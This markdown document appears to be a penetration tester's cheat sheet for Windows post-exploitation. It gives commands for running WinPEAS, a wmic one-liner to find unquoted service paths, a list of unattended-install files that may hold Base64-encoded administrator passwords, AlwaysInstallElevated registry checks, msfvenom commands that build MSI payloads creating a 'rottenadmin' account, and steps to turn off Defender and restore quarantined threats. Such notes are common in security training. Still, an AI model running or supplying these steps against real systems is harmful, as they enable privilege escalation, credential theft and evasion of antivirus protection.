# Windows Post-Exploitation

## WinPeas
WinPEAS is a script that search for possible paths to escalate privileges on Windows hosts.

### To run:
On local host:
~~~
cd /usr/share/peass/winpeas
scp winpeas.exe user@rhost-ip:/path/on/remote/server
~~~

On remote host:
~~~
./winpeas.exe -a
~~~

## Mimikatz
## Unquotes File Paths
To find these services on your machine:   
```wmic service get name,displayname,pathname,startmode, |findstr /i “Auto” | findstr /i /v “C:\Windows\\” | findstr /i /v ”””```

## Unattended Install Files
Check in C:\Windows\Panther for unattended install files. Potentially contain local administrator or domain credentials. These will be stored using Base64 encoding, so just use Burp or CyberChef to obtain cleartext credentials. 
~~~
C:\Windows\Sysprep\sysprep.xml
C:\Windows\Sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\System32\Sysprep\Unattend.xml
C:\Windows\System32\Sysprep\Panther\Unattend.xml
~~~
Within the <UserAccounts> section, check for <Password></Password> anywhere, this will be a Base64 encoded password. 

## AlwaysInstallElevated
If these 2 registers are enabled (value is 0x1), then users of any privilege can install (execute) *.msi files as NT AUTHORITY\SYSTEM.
~~~
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
~~~
### Metasploit payloads
~~~
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
~~~
If you have a meterpreter session you can automate this technique using the module ```exploit/windows/local/always_install_elevated```

## Disable Virus & Threat Protection Settings
* Open Windows Settings
* Go to Windows Security
* Go to Virus & Threat Protection
* Under Virus & Threat Protection Settings
  * Manage Settings
  * Turn off Real-time protection
* Go to Current Threats
  * Protection History
  * Threat quarantines
  * Actions: Restore